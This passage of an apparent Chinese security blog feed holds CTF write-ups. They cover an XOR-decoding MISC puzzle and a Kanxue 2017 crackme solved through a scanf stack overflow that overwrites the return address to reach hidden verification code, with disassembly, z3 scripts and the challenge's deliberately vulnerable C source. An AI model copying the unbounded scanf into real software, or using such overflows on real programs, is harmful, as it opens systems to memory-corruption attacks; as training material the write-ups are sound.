href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>于是flag: DDCTF{7fe2c58fc9a7eb90}</p><p>z3解的话还可以得出具体每个变量的值，这里就不放图了</p><p>From <a href="https://kabeor.github.io/DDCTF2018 Reverse writeup(1">https://kabeor.github.io/DDCTF2018 Reverse writeup(1) baby_mips/</a> baby_mips/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2018-Reverse-writeup&quot;&gt;&lt;a href=&quot;#DDCTF2018-Reverse-writeup&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2018 Reverse writeup&quot;&gt;&lt;/a&gt;DDCTF2018 R
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
      <category term="DDCTF2018" scheme="https://kabeor.github.io/tags/DDCTF2018/"/>
    
      <category term="Reverse" scheme="https://kabeor.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2018 MISC writeup</title>
    <link href="https://kabeor.github.io/DDCTF2018%20MISC%20writeup/"/>
    <id>https://kabeor.github.io/DDCTF2018 MISC writeup/</id>
    <published>2018-05-03T13:33:30.217Z</published>
    <updated>2018-07-16T09:24:46.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2018-MISC-writeup"><a href="#DDCTF2018-MISC-writeup" class="headerlink" title="DDCTF2018 MISC writeup"></a>DDCTF2018 MISC writeup</h1><h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1.签到题"></a>1.签到题</h2><h2 id="2-╯°□°）╯︵-┻━┻"><a href="#2-╯°□°）╯︵-┻━┻" class="headerlink" title="2.(╯°□°）╯︵ ┻━┻"></a>2.(╯°□°）╯︵ ┻━┻</h2><p>给了一段编码</p><blockquote><p> d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</p></blockquote><p>可以看到这串字符只有数字和字母a-f，所以猜测应该是16进制。可以用异或的条件来判断一下，如果与ascii码异或以后得到的是正确的字符的话，异或的结果将不会是乱码。</p><p>思路感觉还是靠经验吧，各种各样的方法，不过总体来说是用<strong>移位爆破</strong>出来的</p><p>下面是两种解题脚本<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s=&quot;d4 e8 e1 f4 a0 f7 e1 f3 a0 e6 e1 f3 f4 a1 a0 d4 e8 e5 a0 e6 ec e1 e7 a0 e9 f3 ba a0 c4 c4 c3 d4 c6 fb b7 b9 b8 e4 b5 b5 e4 e2 b7 b6 b5 b5 b2 e1 b9 b2 b2 e4 b0 b0 e4 b7 b7 b5 e5 b3 b3 b1 b1 b9 b0 b7 fd&quot;</span><br><span class="line">s=s.split()</span><br><span class="line">for key in range(0,128+1,1):</span><br><span class="line">    for i in s:</span><br><span class="line">        i = int(i,16)</span><br><span class="line">        print (chr((i + key + 256) % 256 ), end = &apos;&apos;)</span><br><span class="line">    print (key)</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data=bytearray.fromhex(&apos;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&apos;)</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in data:</span><br><span class="line">    flag = flag + chr(i &amp; 0x7f)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>最后得出flag</p><blockquote><p>That was fast! The flag is: DDCTF{798d55db76552a922d00d775e3311907}</p></blockquote><p>## </p><p>待补充</p><p>From <a href="https://kabeor.github.io/DDCTF2018 MISC writeup/">https://kabeor.github.io/DDCTF2018 MISC writeup/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2018-MISC-writeup&quot;&gt;&lt;a href=&quot;#DDCTF2018-MISC-writeup&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2018 MISC writeup&quot;&gt;&lt;/a&gt;DDCTF2018 MISC write
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
      <category term="DDCTF2018" scheme="https://kabeor.github.io/tags/DDCTF2018/"/>
    
      <category term="MISC" scheme="https://kabeor.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc</title>
    <link href="https://kabeor.github.io/%E7%9C%8B%E9%9B%AA.TSRC%202017CTF%E7%A7%8B%E5%AD%A3%E8%B5%9B%20ctf2017_Fpc/"/>
    <id>https://kabeor.github.io/看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc/</id>
    <published>2018-04-26T15:13:56.689Z</published>
    <updated>2018-07-16T09:30:49.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc"><a href="#看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc" class="headerlink" title="看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc"></a>看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc</h1><blockquote><p>自己做再加上分析别人的wp搞了一星期，这道题终于分析透彻了，感觉自己提升了很多。<br>从这道题中学到的新知识有：</p><ol><li>scanf函数的缓冲区溢出漏洞</li><li>RUN跟踪去除花指令</li><li>Z3约束求解器的使用</li></ol></blockquote><h2 id="基本工作"><a href="#基本工作" class="headerlink" title="基本工作"></a>基本工作</h2><p>无壳的exe</p><p>运行一下<br><img src="https://i.loli.net/2018/07/16/5b4c64eb112d1.jpg" alt="mark"></p><p>搜索字符串<br><img src="https://i.loli.net/2018/07/16/5b4c64eb4595b.jpg" alt="mark"><br>进入Please input your code<br>运行后在输入字符串位置断下<br><img src="https://i.loli.net/2018/07/16/5b4c64eb73a1d.jpg" alt="mark"><br>所以接下来就是算法分析了</p><h2 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h2><p>IDA载入，找到主函数<br><img src="https://i.loli.net/2018/07/16/5b4c64eb8d7fd.jpg" alt="mark"></p><blockquote><p>main函数内部</p></blockquote><p><img src="https://i.loli.net/2018/07/16/5b4c64eba5379.jpg" alt="mark"></p><p>dword_41B034的初值为2</p><p>可以看到判断是否成功前调用了三个call 401050，401090和4010E0<br>其中401050为打印题目并调用    <code>scanf()</code>    <strong>(注意，这很重要，后面有解释)</strong></p><p>后两个看来就是解密函数了，分析一下</p><blockquote><p>sub_401090</p></blockquote><p><img src="https://i.loli.net/2018/07/16/5b4c64ebbce31.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c64ebd2705.jpg" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00401090 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 ; Attributes: bp-based frame</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 sub_401090      proc near               ; CODE XREF: _main+1Cp</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 var_C           = dword ptr -0Ch</span><br><span class="line">.text:00401090 var_8           = dword ptr -8</span><br><span class="line">.text:00401090 var_4           = dword ptr -4</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090                 push    ebp</span><br><span class="line">.text:00401091                 mov     ebp, esp</span><br><span class="line">.text:00401093                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:00401096                 test    ecx, ecx</span><br><span class="line">.text:00401098                 jz      short loc_4010D7</span><br><span class="line">.text:0040109A                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:0040109D                 test    edx, edx</span><br><span class="line">.text:0040109F                 jz      short loc_4010D7</span><br><span class="line">.text:004010A1                 mov     eax, ecx</span><br><span class="line">.text:004010A3                 sub     eax, edx</span><br><span class="line">.text:004010A5                 jz      short loc_4010D7</span><br><span class="line">.text:004010A7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:004010AA                 imul    eax, 5</span><br><span class="line">.text:004010AD                 add     ecx, eax</span><br><span class="line">.text:004010AF                 cmp     ecx, 8F503A42h</span><br><span class="line">.text:004010B5                 jnz     short loc_4010D7</span><br><span class="line">.text:004010B7                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:004010BA                 imul    eax, 0Dh</span><br><span class="line">.text:004010BD                 add     edx, eax</span><br><span class="line">.text:004010BF                 cmp     edx, 0EF503A42h</span><br><span class="line">.text:004010C5                 jnz     short loc_4010D7</span><br><span class="line">.text:004010C7                 mov     edx, 543F30h</span><br><span class="line">.text:004010CC                 xor     edx, 158F04h</span><br><span class="line">.text:004010D2                 mov     eax, [edx]</span><br><span class="line">.text:004010D4                 dec     eax</span><br><span class="line">.text:004010D5                 mov     [edx], eax</span><br><span class="line">.text:004010D7</span><br><span class="line">.text:004010D7 loc_4010D7:                             ; CODE XREF: sub_401090+8j</span><br><span class="line">.text:004010D7                                         ; sub_401090+Fj ...</span><br><span class="line">.text:004010D7                 mov     esp, ebp</span><br><span class="line">.text:004010D9                 pop     ebp</span><br><span class="line">.text:004010DA                 retn</span><br><span class="line">.text:004010DA sub_401090      endp</span><br><span class="line">.text:004010DA</span><br><span class="line">.text:004010DA ; </span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/16/5b4c64ebf02eb.jpg" alt="mark"></p><p>方程</p><blockquote><p>x!=0<br>y!=0<br>x!=y<br>5(y-x)+y=0x8F503A42<br>13(y-x)+x=0xEF503A42</p><p>sub_4010E0<br><img src="https://i.loli.net/2018/07/16/5b4c64ec1506a.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c652d32a3b.jpg" alt="mark"></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:004010E0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 ; Attributes: bp-based frame</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 sub_4010E0      proc near               ; CODE XREF: _main+21p</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 var_C           = dword ptr -0Ch</span><br><span class="line">.text:004010E0 var_8           = dword ptr -8</span><br><span class="line">.text:004010E0 var_4           = dword ptr -4</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0                 push    ebp</span><br><span class="line">.text:004010E1                 mov     ebp, esp</span><br><span class="line">.text:004010E3                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:004010E6                 test    ecx, ecx</span><br><span class="line">.text:004010E8                 jz      short loc_401127</span><br><span class="line">.text:004010EA                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:004010ED                 test    edx, edx</span><br><span class="line">.text:004010EF                 jz      short loc_401127</span><br><span class="line">.text:004010F1                 mov     eax, ecx</span><br><span class="line">.text:004010F3                 sub     eax, edx</span><br><span class="line">.text:004010F5                 jz      short loc_401127</span><br><span class="line">.text:004010F7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:004010FA                 imul    eax, 11h</span><br><span class="line">.text:004010FD                 add     ecx, eax</span><br><span class="line">.text:004010FF                 cmp     ecx, 0F3A94883h</span><br><span class="line">.text:00401105                 jnz     short loc_401127</span><br><span class="line">.text:00401107                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:0040110A                 imul    eax, 7</span><br><span class="line">.text:0040110D                 add     edx, eax</span><br><span class="line">.text:0040110F                 cmp     edx, 33A94883h</span><br><span class="line">.text:00401115                 jnz     short loc_401127</span><br><span class="line">.text:00401117                 mov     edx, 543F30h</span><br><span class="line">.text:0040111C                 xor     edx, 158F04h</span><br><span class="line">.text:00401122                 mov     eax, [edx]</span><br><span class="line">.text:00401124                 dec     eax</span><br><span class="line">.text:00401125                 mov     [edx], eax</span><br><span class="line">.text:00401127</span><br><span class="line">.text:00401127 loc_401127:                             ; CODE XREF: sub_4010E0+8j</span><br><span class="line">.text:00401127                                         ; sub_4010E0+Fj ...</span><br><span class="line">.text:00401127                 mov     esp, ebp</span><br><span class="line">.text:00401129                 pop     ebp</span><br><span class="line">.text:0040112A                 retn</span><br><span class="line">.text:0040112A sub_4010E0      endp</span><br><span class="line">.text:0040112A</span><br><span class="line">.text:0040112A ; </span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/16/5b4c652d46d23.jpg" alt="mark"></p><p>方程</p><blockquote><p>x!=0<br>y!=0<br>x!=y<br>17(y-x)+y=0xF3A94883<br>7(y-x)+x=0x33A94883</p></blockquote><p>这两个函数的方程要满足唯一解很难，并且也不是出题人本意，据说有人解了一天没解出来</p><h2 id="更换思路"><a href="#更换思路" class="headerlink" title="更换思路"></a>更换思路</h2><p>我们再回到主函数分析，再次看到这个scanf(),并且往后翻有大量未识别的数据，从00413131开始<br><img src="https://i.loli.net/2018/07/16/5b4c652d5a74d.jpg" alt="mark"></p><p>于是我们可以考虑一下<strong>缓冲区溢出</strong></p><p><img src="https://i.loli.net/2018/07/16/5b4c652d6ffc0.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/16/5b4c652d94199.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c652da7a36.jpg" alt="mark"></p><p>可以看到，我们输入信息一开始保存在0012FF2C,栈清空后保存在0012FF3C，于是十六进制下3C-2C=10，也就是十进制下的16。<strong>因此如果要覆盖返回地址需要构造12字节的信息外加4个字节的返回地址。</strong><br>我们事实上可以直接覆盖到You get it的地址，因为比赛限制flag只为字母和数字，因此需要另想其他办法</p><p>在IDA中往下翻翻，看到有一大串未识别的数据，于是猜想有可能应该溢出到这里<br><img src="https://i.loli.net/2018/07/16/5b4c652dbaf5e.jpg" alt="mark"><br>首地址为00413131<br>转换成ASCII为A11<br>因为数据在内存中为小段排序，于是应该转换为11A<br>所以我们可以使用测试数据1234567890ab11A来溢出到那段数据</p><p>成功跳入，然后右键分析-&gt;从模块中删除分析识别出正确代码。<br>看到一堆跳转<br><img src="https://i.loli.net/2018/07/16/5b4c652ddf9e7.jpg" alt="mark"></p><p>这里是花指令了</p><h3 id="使用RUN跟踪去除花指令"><a href="#使用RUN跟踪去除花指令" class="headerlink" title="使用RUN跟踪去除花指令"></a>使用RUN跟踪去除花指令</h3><p>断在0x413131处后, 点击菜单栏的”查看”, 选择”RUN跟踪”, 然后再点击”调试”, 选择”跟踪步入”, 程序会记录这段花指令执行的过程<br><img src="https://i.loli.net/2018/07/16/5b4c652e1124e.jpg" alt="mark"></p><p>我觉得应该是把最后一栏显示寄存器的指令提取出来<br>但目前程序显示错误<br><img src="https://i.loli.net/2018/07/16/5b4c653d3e989.jpg" alt="mark"><br>所以先从前向后记录这些有用指令，然后在下面发现一个奇怪的跳转<br><img src="https://i.loli.net/2018/07/16/5b4c653d6140f.jpg" alt="mark"><br>这个跳转后面没有short，也不显示寄存器，而且显然跳转之后导致了错误，因此我们把这里的跳转改掉或下断点修改标志位，重新跟踪<br>然后还有两个jnz<br><img src="https://i.loli.net/2018/07/16/5b4c653d86588.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c653da9f9f.jpg" alt="mark"></p><p>最后一个跳转修改完，跟踪会抛出一个异常<br><img src="https://i.loli.net/2018/07/16/5b4c653dc094c.jpg" alt="mark"></p><p>我们提取这之前的有效代码,一共三段验证<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vaild_1:</span><br><span class="line">00413131    83C4 F0         add esp,-0x10</span><br><span class="line">00413150    33C0            xor eax,eax</span><br><span class="line">00413184    A3 34B04100     mov dword ptr ds:[0x41B034],eax</span><br><span class="line">004131BA    58              pop eax</span><br><span class="line">004131EB    8BC8            mov ecx,eax                            </span><br><span class="line">0041321F    58              pop eax</span><br><span class="line">00413254    8BD8            mov ebx,eax                </span><br><span class="line">00413289    58              pop eax</span><br><span class="line">004132B5    8BD0            mov edx,eax                    </span><br><span class="line">004132AD    8BD0            mov edx,eax</span><br><span class="line">004132E2    8BC1            mov eax,ecx</span><br><span class="line">00413316    2BC3            sub eax,ebx                </span><br><span class="line">00413349    C1E0 02         shl eax,0x2</span><br><span class="line">00413380    03C1            add eax,ecx</span><br><span class="line">004133B5    03C2            add eax,edx</span><br><span class="line">004133E9    2D E217F9EA     sub eax,0xEAF917E2</span><br><span class="line">00413420   /0F85 DD060000   jnz ctf2017_.00413B03</span><br><span class="line"> </span><br><span class="line">vaild_2:                   </span><br><span class="line">00413455    03C1            add eax,ecx                                </span><br><span class="line">00413489    2BC3            sub eax,ebx                </span><br><span class="line">004134BF    8BD8            mov ebx,eax                </span><br><span class="line">004134F3    D1E0            shl eax,1                      </span><br><span class="line">00413525    03C3            add eax,ebx                </span><br><span class="line">00413559    03C1            add eax,ecx                </span><br><span class="line">0041358F    8BC8            mov ecx,eax                </span><br><span class="line">004135C3    03C2            add eax,edx                </span><br><span class="line">004135F7    2D C808F5E8     sub eax,0xE8F508C8</span><br><span class="line">0041362E   /0F85 CF040000   jnz ctf2017_.00413B03</span><br><span class="line"> </span><br><span class="line">vaild_3</span><br><span class="line">00413665    8BC1            mov eax,ecx                </span><br><span class="line">0041365D    8BC1            mov eax,ecx</span><br><span class="line">004136A7    2BC2            sub eax,edx                </span><br><span class="line">004136D8    2D 683C0A0C     sub eax,0xC0A3C68</span><br><span class="line">00413703   /75 04           jnz short ctf2017_.00413709</span><br></pre></td></tr></table></figure></p><p>整理得到三个方程组</p><blockquote><p>((x - y) &lt;&lt; 2) + x + z == 0xEAF917E2<br>((x - y) &lt;&lt; 1) + (x - y) + x + z == 0xE8F508C8<br>((x - y) &lt;&lt; 1) + (x - y) + x - z == 0x0C0A3C68</p></blockquote><h2 id="利用z3约束求解器解方程"><a href="#利用z3约束求解器解方程" class="headerlink" title="利用z3约束求解器解方程"></a>利用z3约束求解器解方程</h2><p>Z3 is a theorem prover from Microsoft Research.<br>相关介绍和安装方法：  <a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">https://github.com/Z3Prover/z3</a></p><p>源码如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from z3 import *</span><br><span class="line">x, y ,z = BitVecs(&apos;x y z&apos;, 64)</span><br><span class="line">#x = Real(&apos;x&apos;)</span><br><span class="line">#y = Real(&apos;y&apos;)</span><br><span class="line">#z = Real(&apos;z&apos;)</span><br><span class="line">solve(((x - y) &lt;&lt; 2) + x + z == 0xEAF917E2,((x - y) &lt;&lt; 1) + (x - y) + x + z == 0xE8F508C8,((x - y) &lt;&lt; 1) + (x - y) + x - z == 0x0C0A3C68)</span><br></pre></td></tr></table></figure></p><p>运行后得到结果<br><code>[z = 1853187632, y = 1919903280, x = 1953723722]</code><br>转换为16进制<br>x = 0x7473754a<br>y = 0x726f6630<br>z = 0x6e756630</p><p>连起来转换为字符串<br><img src="https://i.loli.net/2018/07/16/5b4c653dd528d.jpg" alt="mark"><br>倒过来就是Just0for0fun<br>再加上溢出要用的11A<br>所以<br>flag=Just0for0fun11A</p><p><img src="https://i.loli.net/2018/07/16/5b4c653de79c8.jpg" alt="mark"></p><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p><a href="https://bbs.pediy.com/thread-222404.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222404.htm</a></p><h3 id="主体-VC6"><a href="#主体-VC6" class="headerlink" title="主体(VC6)"></a>主体(VC6)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line"> </span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">int __cdecl Add3(int, int);                                 // proc in asm obj</span><br><span class="line">char * __cdecl very2();                                     // right verify proc, in asm obj, @413131</span><br><span class="line"> </span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125; /* extern &quot;C&quot; */</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">inline void G()&#123; printf(&quot;You get it!\n&quot;);&#125;                  // show good msg, will not have a chance to run</span><br><span class="line">inline void B()&#123; printf(&quot;Bad register-code, keep trying.\n&quot;);&#125;  // show err msg</span><br><span class="line"> </span><br><span class="line">char * InputKey();                                          // get register code, in stack</span><br><span class="line">void very1();                                               // fake verify proc 1</span><br><span class="line">void very3();                                               // fake verify proc 3</span><br><span class="line">int Flag=0x21;                                              // register flag, 21 is a bad-guy</span><br><span class="line">extern &quot;C&quot; int cFlag=0x11;                                  // anti-wrong jump flag</span><br><span class="line"> </span><br><span class="line">&lt;br&gt;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;\n Crackme for CTF2017 @Pediy.\n&quot;);             // show welcome msg</span><br><span class="line">    char Key0[10];                                          // local var, never use</span><br><span class="line">    char *p1;                                               // pointor to stack var, useless</span><br><span class="line">    cFlag=2;</span><br><span class="line">    p1=InputKey();                                          // get register code, it must over-flow to very2()</span><br><span class="line">    //printf(&quot;%s\n&quot;, p1);</span><br><span class="line">    very1();                                                // useless</span><br><span class="line">    very3();                                                // useless</span><br><span class="line">    if(cFlag==0)</span><br><span class="line">        G();</span><br><span class="line">    else</span><br><span class="line">        B();                                        // boom! bad cracker, just wonder where to verify it???</span><br><span class="line">    //getch();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">char * InputKey()                                           // get register code, it must over-flow to very2(), which is coded in ASM, with junk-code</span><br><span class="line">                                                            // dword1 dword2 dword3 11A (address of very2, @413131 )</span><br><span class="line">&#123;</span><br><span class="line">    char Key[10];</span><br><span class="line">    char *p2;</span><br><span class="line">    p2=(char *)&amp;Key;</span><br><span class="line">    printf(&quot; Coded by Fpc.\n\n&quot;);</span><br><span class="line">    printf(&quot; Please input your code: &quot;);</span><br><span class="line">    scanf(&quot;%s&quot;, Key);</span><br><span class="line">    return p2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="两个fake函数-asm"><a href="#两个fake函数-asm" class="headerlink" title="两个fake函数(asm)"></a>两个fake函数(asm)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __declspec(naked) very1()                                              // useless</span><br><span class="line">&#123;</span><br><span class="line">    long int x, y, z;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp, esp</span><br><span class="line">        //mov       eax, esp</span><br><span class="line">        //sub       eax, 8</span><br><span class="line">        //mov       edx, [eax]</span><br><span class="line">        //mov       [ebp-4], edx</span><br><span class="line">        //mov       edx, [eax+4]</span><br><span class="line">        //mov       [ebp-8], edx</span><br><span class="line">        mov     ecx, [ebp-4]</span><br><span class="line">        test        ecx, ecx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     edx, [ebp-8]</span><br><span class="line">        test        edx, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     eax, ecx</span><br><span class="line">        sub     eax, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     [ebp-0x0c], eax</span><br><span class="line">        imul        eax,  5</span><br><span class="line">        add     ecx, eax</span><br><span class="line">        cmp     ecx, 0x08f503a42</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     eax, [ebp-0x0c]</span><br><span class="line">        imul        eax, 13</span><br><span class="line">        add     edx, eax</span><br><span class="line">        cmp     edx, 0x0ef503a42</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     edx, 0x543f30                               // dec flag, anti ida x-ref trick</span><br><span class="line">        xor     edx, 0x158f04</span><br><span class="line">        mov     eax, [edx]</span><br><span class="line">        dec     eax</span><br><span class="line">        mov     [edx], eax</span><br><span class="line">        //mov       cFlag, eax</span><br><span class="line">    //if (x==0)</span><br><span class="line">    //  goto end1;</span><br><span class="line">    //if (y==0)</span><br><span class="line">    //  goto end1;</span><br><span class="line">    //z=x-y;</span><br><span class="line">    //if (z==0)</span><br><span class="line">    //      goto end1;</span><br><span class="line">    //if( ((x+z*5)==0x08f503a42) &amp;&amp; ((y+z*13)==0x0ef503a42) )</span><br><span class="line">    //  G();</span><br><span class="line">end1:</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">    //return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __declspec(naked) very3()                                              // useless</span><br><span class="line">&#123;</span><br><span class="line">    long int x, y, z;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp, esp</span><br><span class="line">        mov     ecx, [ebp-4]</span><br><span class="line">        test        ecx, ecx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     edx, [ebp-8]</span><br><span class="line">        test        edx, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     eax, ecx</span><br><span class="line">        sub     eax, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     [ebp-0x0c], eax</span><br><span class="line">        imul        eax,  17</span><br><span class="line">        add     ecx, eax</span><br><span class="line">        cmp     ecx, 0x0f3a94883</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     eax, [ebp-0x0c]</span><br><span class="line">        imul        eax, 7</span><br><span class="line">        add     edx, eax</span><br><span class="line">        cmp     edx, 0x033a94883</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     edx, 0x543f30</span><br><span class="line">        xor     edx, 0x158f04</span><br><span class="line">        mov     eax, [edx]</span><br><span class="line">        dec     eax</span><br><span class="line">        mov     [edx], eax</span><br><span class="line">end1:</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="验证部分-masm"><a href="#验证部分-masm" class="headerlink" title="验证部分(masm)"></a>验证部分(masm)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public  c very2     ;声明引出的proc</span><br><span class="line"> </span><br><span class="line">extern  cFlag:near</span><br><span class="line"> </span><br><span class="line">.code</span><br><span class="line">    db 10000 dup(0)             ; pushing addr of very2 to 413131 in exe-file</span><br><span class="line">    db 2000h  dup(0)</span><br><span class="line"> </span><br><span class="line">    db 0c3                  ; ret, give some sign for crackerz</span><br><span class="line">                        ;</span><br><span class="line">very2   proc    near c              ; right verify proc here, at 413131</span><br><span class="line">    add esp, -10                ; restore esp, crack must input:0c bytes regcode and addr of very2</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov DWORD ptr cFlag, eax</span><br><span class="line">    ;</span><br><span class="line">    ; check register code</span><br><span class="line">    ; correct register code at stack:</span><br><span class="line">    ;       Just_for_fun + 11A(addr of very2)</span><br><span class="line">    ;</span><br><span class="line">    ;解个三元一次方程</span><br><span class="line">    ;5x-4y+z=A</span><br><span class="line">    ;4x-3y+z=B</span><br><span class="line">    ;4x-3y-z=C</span><br><span class="line">    ;</span><br><span class="line">    pop eax</span><br><span class="line">    mov ecx, eax        ;eax=x      7473754a</span><br><span class="line">    pop eax         ;eax=y      726f6630</span><br><span class="line">    mov ebx, eax</span><br><span class="line">    pop eax         ;z      6e756630</span><br><span class="line">    mov edx, eax</span><br><span class="line">    mov eax, ecx        ;x</span><br><span class="line">    sub eax, ebx        ;x-y        2040f1a</span><br><span class="line">    shl eax, 2      ;4(x-y)     8103c68</span><br><span class="line">    add eax, ecx        ;x=x+4(x-y) 7c83b1b2</span><br><span class="line">    add eax, edx        ;x=x+4(x-y)+z   eaf917e2</span><br><span class="line">    sub eax, 0eaf917e2  ;A</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    add eax, ecx</span><br><span class="line">    sub eax, ebx        ;x-y</span><br><span class="line">    mov ebx, eax</span><br><span class="line">    shl eax, 1</span><br><span class="line">    add eax, ebx        ;3(x-y)     60c2d4e</span><br><span class="line">    add eax, ecx        ;x+3(x-y)</span><br><span class="line">    mov ecx, eax        ;x+3(x-y)   7a7fa298</span><br><span class="line">    add eax, edx        ;x+3(x-y)+z e8f508c8</span><br><span class="line">    sub eax, 0e8f508c8  ;B</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    mov eax, ecx</span><br><span class="line">    sub eax, edx        ;x+3(x-y)-z c0a3c68</span><br><span class="line">    sub eax, 0c0a3c68   ;C</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    ;</span><br><span class="line">    ;eax=0</span><br><span class="line">    ;ebx=02040f1a</span><br><span class="line">    ;ecx=7a7fa298</span><br><span class="line">    ;edx=6e756630</span><br><span class="line">    pop eax         ; balance stack, eax=413131</span><br><span class="line">    ;set flag to 0, show good cracker msg</span><br><span class="line">    xor eax, 8101       ;eax=41b030, addr of flag</span><br><span class="line">    mov edi, eax</span><br><span class="line">    xor eax, eax</span><br><span class="line">    stosd           ;set flag</span><br><span class="line">    call @f</span><br><span class="line">    ;buffer for good message: &quot;You get it!&quot;, in 3 dwords</span><br><span class="line">    dd 0050600e8, 1702,1702</span><br><span class="line">@@:</span><br><span class="line">    ; recover 